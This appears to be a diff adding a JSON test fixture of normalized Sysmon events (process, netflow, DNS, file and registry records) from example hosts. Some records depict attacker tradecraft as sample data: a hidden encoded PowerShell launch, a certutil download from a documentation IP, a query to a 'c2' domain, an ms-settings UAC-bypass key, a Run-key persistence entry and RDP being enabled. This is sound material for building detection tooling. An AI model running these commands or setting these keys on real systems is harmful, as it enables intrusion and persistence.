@@ -1,0 +1,396 @@
+[
+  {
+    "line": 1,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023301123000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2817",
+      "computer_name": "ws01.example.com",
+      "host_id": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "process_create_time_usec": 1792023301123000,
+      "process_correlation_id": "{5c7b1d2e-6a10-6710-1a00-000000000700}",
+      "process_id": "4321",
+      "image_path": "C:\\Windows\\System32\\cmd.exe",
+      "process": "cmd.exe",
+      "commandline": "\"C:\\Windows\\system32\\cmd.exe\" /c whoami /all",
+      "username": "EXAMPLE\\jdoe",
+      "parent_process_correlation_id": "{5c7b1d2e-69f1-6710-5c00-000000000700}",
+      "parent_process_id": "6120",
+      "parent_image_path": "C:\\Windows\\explorer.exe",
+      "program_hash": {
+        "sha256": "0B1C2D3E4F5061728394A5B6C7D8E9F000112233445566778899AABBCCDDEEFF"
+      },
+      "process_is_admin": false
+    }
+  },
+  {
+    "line": 2,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023372554000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2818",
+      "computer_name": "ws01.example.com",
+      "host_id": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "process_create_time_usec": 1792023372554000,
+      "process_correlation_id": "{5c7b1d2e-6a5c-6710-1d00-000000000700}",
+      "process_id": "7788",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "process": "powershell.exe",
+      "commandline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGgAaQA=",
+      "username": "EXAMPLE\\svc-deploy",
+      "parent_process_correlation_id": "{5c7b1d2e-6a5b-6710-1c00-000000000700}",
+      "parent_process_id": "7012",
+      "parent_image_path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "program_hash": {
+        "md5": "7353F60B1739074EB17C5F4DDDEFE239",
+        "sha1": "04A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3",
+        "sha256": "9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F"
+      },
+      "process_is_admin": true
+    }
+  },
+  {
+    "line": 3,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023450007000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "551204",
+      "computer_name": "srv02.example.com",
+      "host_id": "srv02.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "process_create_time_usec": 1792023450007000,
+      "process_correlation_id": "{7a1b2c3d-6a9a-6710-0b01-000000001200}",
+      "process_id": "3012",
+      "image_path": "C:\\Windows\\System32\\certutil.exe",
+      "process": "certutil.exe",
+      "commandline": "certutil.exe -urlcache -split -f http://198.51.100.66/a.txt C:\\ProgramData\\a.txt",
+      "username": "NT AUTHORITY\\SYSTEM",
+      "parent_process_correlation_id": "{7a1b2c3d-6a99-6710-0a01-000000001200}",
+      "parent_process_id": "2988",
+      "parent_image_path": "C:\\Windows\\System32\\cmd.exe",
+      "program_hash": {
+        "md5": "0F7C4D8D5E3A2B1C9E8D7F6A5B4C3D2E",
+        "sha256": "1B2C3D4E5F60718293A4B5C6D7E8F9001122334455667788990AABBCCDDEEFF1"
+      },
+      "process_is_admin": true
+    }
+  },
+  {
+    "line": 4,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_NETFLOW",
+    "schema": "scwx.netflow",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023302456000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2820",
+      "host_id": "ws01.example.com",
+      "source_address": "192.0.2.10",
+      "source_port": 50432,
+      "destination_address": "198.51.100.20",
+      "destination_port": 443,
+      "protocol": 6,
+      "direction": "OUTBOUND",
+      "process_image_path": "C:\\Windows\\System32\\curl.exe",
+      "event_metadata": {
+        "record": [
+          {
+            "key": "process_id",
+            "value": "4410"
+          },
+          {
+            "key": "process_guid",
+            "value": "{5c7b1d2e-6a12-6710-1b00-000000000700}"
+          },
+          {
+            "key": "user",
+            "value": "EXAMPLE\\jdoe"
+          },
+          {
+            "key": "source_hostname",
+            "value": "ws01.example.com"
+          },
+          {
+            "key": "destination_port_name",
+            "value": "https"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 5,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_NETFLOW",
+    "schema": "scwx.netflow",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023519902000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "551230",
+      "host_id": "srv02.example.com",
+      "source_address": "2001:db8:10::25",
+      "source_port": 61022,
+      "destination_address": "2001:db8:20::2",
+      "destination_port": 3389,
+      "protocol": 17,
+      "direction": "INBOUND",
+      "process_image_path": "C:\\Windows\\System32\\svchost.exe",
+      "event_metadata": {
+        "record": [
+          {
+            "key": "process_id",
+            "value": "1104"
+          },
+          {
+            "key": "process_guid",
+            "value": "{7a1b2c3d-5f02-6710-2400-000000001200}"
+          },
+          {
+            "key": "user",
+            "value": "NT AUTHORITY\\NETWORK SERVICE"
+          },
+          {
+            "key": "destination_hostname",
+            "value": "srv02.example.com"
+          },
+          {
+            "key": "destination_port_name",
+            "value": "ms-wbt-server"
+          },
+          {
+            "key": "rule_name",
+            "value": "technique_id=T1021.001,technique_name=Remote Desktop Protocol"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 6,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_DNSQUERY",
+    "schema": "scwx.dnsquery",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023302789000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2821",
+      "host_id": "ws01.example.com",
+      "query_name": "updates.example.com",
+      "response_code": 0,
+      "responses": {
+        "records": [
+          {
+            "response_data": "cdn.example.net",
+            "response_type": 5
+          },
+          {
+            "response_data": "198.51.100.20",
+            "response_type": 1
+          },
+          {
+            "response_data": "198.51.100.21",
+            "response_type": 1
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 7,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_DNSQUERY",
+    "schema": "scwx.dnsquery",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023304010000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2822",
+      "host_id": "ws01.example.com",
+      "query_name": "c2-7f3a.example.org",
+      "response_code": 3
+    }
+  },
+  {
+    "line": 8,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_FILEMOD",
+    "schema": "scwx.filemod",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023380330000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2823",
+      "host_id": "ws01.example.com",
+      "file_name": "C:\\Users\\svc-deploy\\AppData\\Local\\Temp\\upd.exe",
+      "process_id": "7788",
+      "process_correlation_id": "{5c7b1d2e-6a5c-6710-1d00-000000000700}",
+      "process_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "process_username": "EXAMPLE\\svc-deploy",
+      "action": "created",
+      "was_modification_allowed": true
+    }
+  },
+  {
+    "line": 9,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_FILEMOD",
+    "schema": "scwx.filemod",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023545871000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2824",
+      "host_id": "ws01.example.com",
+      "file_name": "C:\\Users\\svc-deploy\\AppData\\Local\\Temp\\upd.exe",
+      "process_id": "7788",
+      "process_correlation_id": "{5c7b1d2e-6a5c-6710-1d00-000000000700}",
+      "process_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "process_username": "EXAMPLE\\svc-deploy",
+      "file_hash": {
+        "md5": "11223344556677889900AABBCCDDEEFF",
+        "sha1": "1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D",
+        "sha256": "AA00BB11CC22DD33EE44FF5566778899AABBCCDDEEFF00112233445566778899"
+      },
+      "action": "deleted",
+      "was_modification_allowed": true
+    }
+  },
+  {
+    "line": 10,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_FILEMOD",
+    "schema": "scwx.filemod",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023611402000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "551260",
+      "host_id": "srv02.example.com",
+      "file_name": "C:\\ProgramData\\a.txt",
+      "process_id": "3388",
+      "process_correlation_id": "{7a1b2c3d-6aa0-6710-1101-000000001200}",
+      "process_image_path": "C:\\Windows\\System32\\cmd.exe",
+      "process_username": "NT AUTHORITY\\SYSTEM",
+      "file_hash": {
+        "md5": "5D41402ABC4B2A76B9719D911017C592",
+        "sha256": "2CF24DBA5FB0A30E26E83B2AC5B9E29E1B161E5C1FA7425E73043362938B9824"
+      },
+      "action": "deleted",
+      "was_modification_allowed": true
+    }
+  },
+  {
+    "line": 11,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_FILEMOD",
+    "schema": "scwx.filemod",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023660115000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2826",
+      "host_id": "ws01.example.com",
+      "file_name": "C:\\Users\\jdoe\\Downloads\\invoice.exe",
+      "process_id": "4410",
+      "process_correlation_id": "{5c7b1d2e-6a12-6710-1b00-000000000700}",
+      "process_image_path": "C:\\Windows\\System32\\curl.exe",
+      "process_username": "EXAMPLE\\jdoe",
+      "file_hash": {
+        "sha256": "3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F80912AB"
+      },
+      "action": "created",
+      "was_modification_allowed": false
+    }
+  },
+  {
+    "line": 12,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_REGISTRY",
+    "schema": "scwx.registry",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023390002000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2827",
+      "host_id": "ws01.example.com",
+      "process_id": "7788",
+      "process_correlation_id": "{5c7b1d2e-6a5c-6710-1d00-000000000700}",
+      "path": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1104\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "name": "command"
+    }
+  },
+  {
+    "line": 13,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_REGISTRY",
+    "schema": "scwx.registry",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023391448000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2828",
+      "host_id": "ws01.example.com",
+      "process_id": "7788",
+      "process_correlation_id": "{5c7b1d2e-6a5c-6710-1d00-000000000700}",
+      "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+      "name": "Updater",
+      "value": {
+        "name": "Updater",
+        "data64": "C:\\Users\\svc-deploy\\AppData\\Local\\Temp\\upd.exe /silent"
+      }
+    }
+  },
+  {
+    "line": 14,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_REGISTRY",
+    "schema": "scwx.registry",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023765019000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "551270",
+      "host_id": "srv02.example.com",
+      "process_id": "4096",
+      "process_correlation_id": "{7a1b2c3d-6ab0-6710-1501-000000001200}",
+      "path": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections",
+      "name": "fDenyTSConnections",
+      "value": {
+        "name": "fDenyTSConnections",
+        "data64": "DWORD (0x00000000)",
+        "type64": "REG_DWORD"
+      }
+    }
+  },
+  {
+    "line": 15,
+    "extractor_path": "MICROSOFT_SYSMON_SNARE_CHILD_REGISTRY",
+    "schema": "scwx.registry",
+    "normalized": {
+      "sensor_type": "Microsoft Sysmon",
+      "event_time_usec": 1792023790640000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "2830",
+      "host_id": "ws01.example.com",
+      "process_id": "5120",
+      "process_correlation_id": "{5c7b1d2e-6ac0-6710-2001-000000000700}",
+      "path": "HKLM\\SOFTWARE\\Example\\Agent",
+      "name": "Agent"
+    }
+  },
+  {
+    "line": 16,
+    "extractor_path": null,
+    "schema": "scwx.generic",
+    "normalized": null
+  }
+]
